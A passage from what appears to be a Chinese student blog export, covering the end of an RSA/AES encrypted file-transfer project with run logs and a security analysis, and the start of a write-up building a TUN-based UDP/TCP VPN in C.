print(<span class="hljs-string">&quot;---&quot;</span> * <span class="hljs-number">5</span> + <span class="hljs-string">&quot;开始传输密文&quot;</span> + <span class="hljs-string">&quot;---&quot;</span> * <span class="hljs-number">5</span>)
<span class="hljs-comment"># 一共发送八条消息</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
    print(<span class="hljs-string">&quot;发送第&#123;0&#125;条消息&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))
    plain = read_file(i)  <span class="hljs-comment"># 读取文件内容</span>
    print(<span class="hljs-string">&quot;待加密的内容:&quot;</span>, plain)
    enc_plain = AES_enc(plain, key)  <span class="hljs-comment"># 使用AES算法加密内容</span>
    print(<span class="hljs-string">&quot;加密后的结果:&quot;</span>, enc_plain)
    client.recv(<span class="hljs-number">512</span>)

    length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(enc_plain)))  <span class="hljs-comment"># 传输发送内容的长度</span>
    length = <span class="hljs-built_in">bytes</span>(length, <span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># 方便其接收</span>
    client.send(length)
    print(<span class="hljs-string">&quot;传输密文...&quot;</span>)
    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(enc_plain), <span class="hljs-string">&quot;utf-8&quot;</span>))  <span class="hljs-comment"># 发送密文</span>

message = client.recv(<span class="hljs-number">512</span>).decode()
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
crypt_message = client.recv(<span class="hljs-number">512</span>).decode()
hash_message = RSADecode(<span class="hljs-built_in">int</span>(crypt_message),e,n_bob)
<span class="hljs-keyword">if</span> hash_message == md5(message):
    print(message)
print(<span class="hljs-string">&quot;文件传输结束！&quot;</span>)

client.close()</code></pre>

<h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><p>程序运行截图</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714162621437.png" alt="image-20210714162621437" style="zoom:50%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714162636877.png" alt="image-20210714162636877" style="zoom:50%;">

<p>服务器端</p>
<pre><code class="hljs makefile"><span class="hljs-section">生成的p: 212578631077022742980302422715125542611</span>
<span class="hljs-section">生成的q: 316188159582830019844276947208676920009</span>
Waiting connection...
<span class="hljs-section">Alice使用的公钥n: 76623010774774676027114980830533718839055908618566240235027551452927884987983</span>
验证alice身份...
This is alice.
验证通过！
等待alice验证自身身份...
您通过了验证!
-----------开始接收对称加密密钥-------------
<span class="hljs-section">收到的对称加密密钥: 0x12345678</span>
---------------开始接收密文---------------
接收第1条消息
<span class="hljs-section">收到的密文: 135682548930565198779372680096238675594</span>
<span class="hljs-section">收到的消息: NUP-SCS</span>

接收第2条消息
<span class="hljs-section">收到的密文: 204524647430676670718786346706390507203</span>
<span class="hljs-section">收到的消息: helle,bob!</span>
接收第3条消息
<span class="hljs-section">收到的密文: 246320535020402174803721345214000008151</span>
<span class="hljs-section">收到的消息: I am alice!</span>
接收第4条消息
<span class="hljs-section">收到的密文: 58157974753797302313029320017455836609</span>
<span class="hljs-section">收到的消息: I am a cumter!</span>
接收第5条消息
<span class="hljs-section">收到的密文: 226398669380783825649368460310305319452</span>
<span class="hljs-section">收到的消息: zheshixiexiaox</span>
接收第6条消息
<span class="hljs-section">收到的密文: 53302749101918911090246485689074999058</span>
<span class="hljs-section">收到的消息: sadsadddddd</span>
接收第7条消息
<span class="hljs-section">收到的密文: 176777421636819016900191058879173899767</span>
<span class="hljs-section">收到的消息: asdasda</span>
接收第8条消息
<span class="hljs-section">收到的密文: 3474752232209638365517789143309475776</span>
<span class="hljs-section">收到的消息: welcome to nwpu!</span>
文件传输结束！

Process finished with exit code 0</code></pre>

<p>客户端</p>
<pre><code class="hljs makefile"><span class="hljs-section">生成的p: 248283914849807386247828596061320396999</span>
<span class="hljs-section">生成的q: 308610450343211666351389068102678761017</span>
Welcome connect!
<span class="hljs-section">开分发RSA公钥n:</span>
<span class="hljs-section">bob使用的公钥n: 67214846126881216073162389743685441714708801777758418373886646066828368003499</span>
等待bob验证自身身份...
您通过了验证!
验证bob身份...
This is bob.
验证通过!
------------开始传输对称加密密钥-----------
<span class="hljs-section">RAS加密后的密钥: 32731716332593832426148490730299678696611415440651747149365389018478993136648</span>
开始传输......
---------------开始传输密文---------------
发送第1条消息
读取成功!
<span class="hljs-section">待加密的内容: NUP-SCS</span>

<span class="hljs-section">加密后的结果: 135682548930565198779372680096238675594</span>
传输密文...
发送第2条消息
读取成功!
<span class="hljs-section">待加密的内容: helle,bob!</span>
<span class="hljs-section">加密后的结果: 204524647430676670718786346706390507203</span>
传输密文...
发送第3条消息
读取成功!
<span class="hljs-section">待加密的内容: I am alice!</span>
<span class="hljs-section">加密后的结果: 246320535020402174803721345214000008151</span>
传输密文...
发送第4条消息
读取成功!
<span class="hljs-section">待加密的内容: I am a cumter!</span>
<span class="hljs-section">加密后的结果: 58157974753797302313029320017455836609</span>
传输密文...
发送第5条消息
读取成功!
<span class="hljs-section">待加密的内容: zheshixiexiaox</span>
<span class="hljs-section">加密后的结果: 226398669380783825649368460310305319452</span>
传输密文...
发送第6条消息
读取成功!
<span class="hljs-section">待加密的内容: sadsadddddd</span>
<span class="hljs-section">加密后的结果: 53302749101918911090246485689074999058</span>
传输密文...
发送第7条消息
读取成功!
<span class="hljs-section">待加密的内容: asdasda</span>
<span class="hljs-section">加密后的结果: 176777421636819016900191058879173899767</span>
传输密文...
发送第8条消息
读取成功!
<span class="hljs-section">待加密的内容: welcome to nwpu!</span>
<span class="hljs-section">加密后的结果: 3474752232209638365517789143309475776</span>
传输密文...
Bob received the file successfully!
文件传输结束！</code></pre>

<h1 id="五、安全分析"><a href="#五、安全分析" class="headerlink" title="五、安全分析"></a>五、安全分析</h1><ul>
<li><p>本系统最脆弱也是最危险的位置就是RSA密钥分发。在商业使用的密钥分发都存在一个可信的第三方（CA）,其作用是将用户的信息和用户使用的公钥用自己的私钥隐藏在证书中。当bob从可信第三方获取到alice的证书时，需要使用可信第三方的私钥（在CA的根证书）解密证书获取证书所有者信息和公钥（alice），alice使用同样的方法验证bob的信息，这样可以确保不会被中间人攻击。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210715155058235.png" alt="image-20210715155058235"></p>
</li>
<li><p>认证过程的安全性</p>
<p>认证过程采用的是第二类签名算法，Alice和Bob的私钥只有自己知道，当Alice使用自己的私钥加密信息后，拥有Alice公钥的Bob能够解密其发送的内容，并使用验证公式就可以验证对面是否为Alice。</p>
<p>该过程可以理解为：</p>
<p>因为只有A才拥有私钥d ，而且由公钥e 和n在计算上不能求出保密的私钥。因此签名的操作只有A才能进行，任何其他人都不能伪造签名。所以，私钥d就相当于A的印章或指纹，而加密信息SA就是A对M（明文）的签名。因此A不能抵赖，任何其他人不能伪造。</p>
<p>这个过程具有不可否认认性和伪造攻击</p>
</li>
<li><p>对AES密钥加密使用的是RSA算法，该过程可以使用更大的数字来保证其安全性。比如使用生成1024位的p,q计算出n。由于我们知道公钥算法目前是安全的，所以这里加密后的密钥是安全的，即使被截获，攻击者也很难破解出明文信息。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN</title>
    <url>/2021/07/21/VPN/</url>
    <content><![CDATA[<p>操作系统大作业</p>
<span id="more"></span>

<h1 id="一、基于UDP-TCP的VPN"><a href="#一、基于UDP-TCP的VPN" class="headerlink" title="一、基于UDP/TCP的VPN"></a>一、基于UDP/TCP的VPN</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><ul>
<li>tun 接口</li>
<li>VPN搭建</li>
<li>隧道转发数据包</li>
</ul>
<h3 id="tun-设备"><a href="#tun-设备" class="headerlink" title="tun 设备"></a>tun 设备</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>tun(/tap) 是 Linux 内核 2.4.x 版本之后实现的虚拟网络设备，不同于物理网卡靠硬件网卡实现，tap/tun 虚拟网卡完全由软件来实现，功能和硬件实现完全没有差别，它们都属于网络设备，都可以配置 IP，都归 Linux 网络设备管理模块统一管理。</p>
<h4 id="TUN-工作机制"><a href="#TUN-工作机制" class="headerlink" title="TUN 工作机制"></a><strong>TUN 工作机制</strong></h4><p>TUN 设备是一种虚拟网络设备，通过此设备，程序可以方便得模拟网络行为。其工作方式如图</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707171052692.png" alt="image-20210707171052692" style="zoom:80%;">

<p>Linux Tun/Tap驱动程序为应用程序提供了两种交互方式：虚拟网络接口和字符设备/dev/net/tun。写入字符设备/dev/net/tun的数据会发送到虚拟网络接口中；发送到虚拟网络接口中的数据也会出现在该字符设备上。</p>
<p>应用程序可以通过标准的Socket API向Tun/Tap接口发送IP数据包，就好像对一个真实的网卡进行操作一样。除了应用程序以外，操作系统也会根据TCP/IP协议栈的处理向Tun/Tap接口发送IP数据包或者以太网数据包，例如ARP或者ICMP数据包。Tun/Tap驱动程序会将Tun/Tap接口收到的数据包原样写入到/dev/net/tun字符设备上，处理Tun/Tap数据的应用程序如VPN程序可以从该设备上读取到数据包，以进行相应处理。</p>
<p>应用程序也可以通过/dev/net/tun字符设备写入数据包，这种情况下该字符设备上写入的数据包会被发送到Tun/Tap虚拟接口上，进入操作系统的TCP/IP协议栈进行相应处理，就像从物理网卡进入操作系统的数据一样。</p>
<h3 id="搭建-VPN"><a href="#搭建-VPN" class="headerlink" title="搭建 VPN"></a>搭建 VPN</h3><p><strong>其工作流程为：</strong></p>
<p>通过程序可以从<code>/dev/net/tun</code>字符设备中读取<code>(read)</code>或者写入<code>(write)</code>数据，再通过将Tun结合物理网络设备使用,我们可以创建一个点对点的隧道。如下图所示，左边主机上应用程序发送到Tun虚拟设备上的IP数据包被VPN程序通过字符设备接收，然后再通过一个UDP隧道发送到右端的VPN服务器上，VPN服务器将隧道负载中的原始IP数据包写入字符设备，这些IP包就会出现在右侧的Tun虚拟设备上，最后通过操作系统协议栈和socket接口发送到右侧的应用程序上。</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707180318134.png" alt="image-20210707180318134" style="zoom:80%;">

<h3 id="通过隧道发送-接收包"><a href="#通过隧道发送-接收包" class="headerlink" title="通过隧道发送/接收包"></a>通过隧道发送/接收包</h3><blockquote>
<p>当隧道建立后，如何通过隧道发送/接收数据包是需要解决的问题</p>
</blockquote>
<ul>
<li><p>通过隧道发送</p>
<p>通过TUN接口获得一个IP包—&gt;加密（或者验证)—&gt;把它作为载荷发送到隧道另一端</p>
</li>
<li><p>通过隧道接收</p>
<p>通过隧道接收载荷—&gt;解密并验证数据—&gt;获得真实的包数据—&gt;把包数据写到TUN接口。</p>
</li>
</ul>
<p>如下图所示</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707214533426.png" alt="image-20210707214533426"></p>
<p><strong>监听socket和tun0网卡，然后转发数据包</strong></p>
<p>每一个隧道应用都有两种接口: socket接口、TUN接口，两种接口都需要监听，需要在两种接口间转发数据。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092049656.png" alt="image-20210708092049656"></p>
<h2 id="程序实现"><a href="#程序实现" class="headerlink" title="程序实现"></a>程序实现</h2><p>在编写程序之前需要做一些准备，程序流程图如下</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092000296.png" alt="image-20210708092000296" style="zoom:80%;">

<p>从图中可知程序中主要包含四个部分</p>
<ul>
<li>创建tun0网卡</li>
<li>客户端和服务器socket连接</li>
<li>转发来自tunnel和tun0数据</li>
<li>主程序，监听接口阻塞进程</li>
</ul>
<p><code>vpnclient</code> 和 <code>vpnserver</code> 程序是 VPN 隧道的两端。它们通过套接字使用  UDP 相互通信。客户端和服务器之间的虚线描绘了 VPN 隧道的路径。 VPN 客户端和服务器程序通过 TUN 接口连接到主机系统，通过它他们做两件事：</p>
<p>（1）从主机系统获取 IP 数据包，因此数据包可以通过隧道发送</p>
<p>（2）从隧道获取 IP 数据包，然后将其转发到托管系统，该系统会将数据包转发到其最终目的地。</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707184214724.png" alt="image-20210707184214724" style="zoom: 80%;">

<h3 id="创建tun网卡"><a href="#创建tun网卡" class="headerlink" title="创建tun网卡"></a>创建tun网卡</h3><p>在上图中可以看到客户端和服务器都需要一个tun网卡，所以需要在两台主机上都创建一个tun0网卡，从而形成<code>tunnel</code>，实现通信</p>
<p>使用命令创建tun网卡</p>
<pre><code class="hljs shell">ip tuntap add dev tun0 mode tun</code></pre>

<p>当上面的命令执行完再使用<code>ifconfig -a</code>就可以看到刚刚创建的<code>tun0</code>网卡，再使用如下的命令对其配置</p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre>

<p>但是这里为了程序执行方便，直接在程序中创建虚拟网卡</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-keyword">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;</code></pre>

<h3 id="socket连接"><a href="#socket连接" class="headerlink" title="socket连接"></a>socket连接</h3><p><code>VPN server</code></p>
<h4 id="UDP连接"><a href="#UDP连接" class="headerlink" title="UDP连接"></a>UDP连接</h4><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initUDPServer</span><span class="hljs-params">()</span> </span>&#123;
    <span class="hljs-keyword">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>
    <span class="hljs-keyword">char</span> buff[<span class="hljs-number">100</span>];

    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));
    server.sin_family = AF_INET;       <span class="hljs-comment">// 服务器地址类型为IPV4            </span>
    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//服务器IP</span>
    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// 端口号</span>

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建UDP的套接字</span>
    bind(sockfd, (struct sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socket绑定地址和端口</span>
    <span class="hljs-comment">// 等待连接</span>
    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//清空缓冲区</span>
    <span class="hljs-keyword">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(struct sockaddr_in); <span class="hljs-comment">//初始化结构体</span>
    <span class="hljs-keyword">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// 等待接收数据 </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);
    <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">connectToUDPServer</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-comment">//创建socket连接 连接到vpn服务器</span>
    <span class="hljs-keyword">int</span> sockfd;
    <span class="hljs-keyword">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;
	<span class="hljs-comment">//指定服务器的地址结构</span>
    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));
    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// 服务器地址类型为IPV4   </span>
    peerAddr.sin_port = htons(PORT_NUMBER);
    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
  
    sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// 连接服务器后发送一个消息 hello</span>
                (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>

<h4 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h4><p><code>VPN server</code></p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initTCPServer</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_server</span>;</span>
    <span class="hljs-keyword">int</span> listen_sock;

    listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    CHK_ERR(listen_sock, <span class="hljs-string">&quot;socket&quot;</span>);
    <span class="hljs-built_in">memset</span> (&amp;sa_server, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(sa_server));
    sa_server.sin_family      = AF_INET;
    sa_server.sin_addr.s_addr = INADDR_ANY;
    sa_server.sin_port        = htons (<span class="hljs-number">4433</span>);
    <span class="hljs-keyword">int</span> err = bind(listen_sock, (struct sockaddr*)&amp;sa_server, <span class="hljs-keyword">sizeof</span>(sa_server));
    CHK_ERR(err, <span class="hljs-string">&quot;bind&quot;</span>);
    err = listen(listen_sock, <span class="hljs-number">5</span>);
    CHK_ERR(err, <span class="hljs-string">&quot;listen&quot;</span>);
    <span class="hljs-keyword">return</span> listen_sock;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initTCPClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname, <span class="hljs-keyword">int</span> port)</span></span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span>

   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostent</span>* <span class="hljs-title">hp</span> =</span> gethostbyname(hostname);
	<span class="hljs-comment">// 创建TCP socket</span>
   <span class="hljs-keyword">int</span> sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

   <span class="hljs-comment">// 填写ip 端口 和协议信息</span>
   <span class="hljs-built_in">memset</span> (&amp;server_addr, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(server_addr));
   <span class="hljs-built_in">memcpy</span>(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length);
   server_addr.sin_port   = htons (port);
   server_addr.sin_family = AF_INET;

   <span class="hljs-comment">// 连接目的地址</span>
   connect(sockfd, (struct sockaddr*) &amp;server_addr,
           <span class="hljs-keyword">sizeof</span>(server_addr));
   <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>



<h3 id="转发端口数据"><a href="#转发端口数据" class="headerlink" title="转发端口数据"></a>转发端口数据</h3><p>客户端程序和服务器端程序都需要以下两个库函数</p>
<blockquote>
<p>int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen);</p>
<p>函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0,  参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度.</p>
<p>int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen);</p>
<p>函数说明：recv()用来接收远程主机经指定的socket 传来的数据, 并把数据存到由参数buf 指向的内存空间, 参数len 为可接收数据的最大长度. 参数flags 一般设0,  参数from 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数fromlen 为sockaddr 的结构长度.</p>
</blockquote>
<p>从tun0接收数据转发到tunnel</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;</code></pre>

<p>从tunnel接收数据转发到tun0</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);								<span class="hljs-comment">// 通过write发送到tun0</span>
&#125;</code></pre>



<h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><p>主要作用，调用之前的函数，创建tun0网卡；建立基于udp的socket连接；循环接收数据</p>
<p>用到的库函数</p>
<blockquote>
<p>int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout);</p>
<p>函数说明：select()用来等待文件描述词状态的改变，会阻塞进程. 参数n 代表最大的文件描述词加1, 参数readfds、writefds 和exceptfds 称为描述词组, 是用来回传该描述词的读, 写或例外的状况. 底下的宏提供了处理这三种描述词组的方式：</p>
<p>  FD_CLR(inr fd, fd_set*  set); 用来清除描述词组set 中相关fd 的位<br>  FD_ISSET(int fd, fd_set * set); 用来测试描述词组set 中相关fd 的位是否为真<br>  FD_SET(int fd, fd_set* set); 用来设置描述词组set 中相关fd 的位<br>  FD_ZERO(fd_set * set); 用来清除描述词组set 的全部位 </p>
<p>FD_ISSET</p>
<p>检测fd在fdset集合中的状态是否变化，当检测到fd状态发生变化时返回真，否则，返回假（也可以认为集合中指定的文件描述符是否可以读写）。</p>
<p>fd_set</p>
<p>可以理解为一个集合，这个集合中存放的是文件描述符(file descriptor)，即文件句柄，它用一位来表示一个fd（下面会仔细介绍）</p>
</blockquote>
<pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;
   <span class="hljs-keyword">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
													    <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;</code></pre>



<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p><code>VPN server</code></p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if_tun.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_NUMBER 55555</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUFF_SIZE 2000</span>

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-keyword">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initUDPServer</span><span class="hljs-params">()</span> </span>&#123;
    <span class="hljs-keyword">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>
    <span class="hljs-keyword">char</span> buff[<span class="hljs-number">100</span>];

    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));
    server.sin_family = AF_INET;       <span class="hljs-comment">// 服务器地址类型为IPV4            </span>
    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//服务器IP</span>
    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// 端口号</span>

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建UDP的套接字</span>
    bind(sockfd, (struct sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socket绑定地址和端口</span>
    <span class="hljs-comment">// 等待连接</span>
